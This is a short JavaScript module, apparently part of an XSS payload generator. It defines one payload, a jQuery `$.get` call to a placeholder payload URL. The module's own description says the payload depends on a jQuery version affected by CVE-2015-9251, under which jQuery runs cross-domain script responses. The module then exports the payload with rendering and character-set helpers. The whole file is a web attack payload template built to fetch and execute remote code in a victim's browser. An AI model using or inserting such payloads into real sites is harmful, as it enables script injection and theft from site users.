import renderable from '../lib/renderable.js'
import CharSet from '../lib/CharSet.js'

const script = '$.get("$$PAYLOAD_URL$$")'

export default {
    description: `Standard JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
    script: renderable(script),
    charsets: new CharSet(script)
}

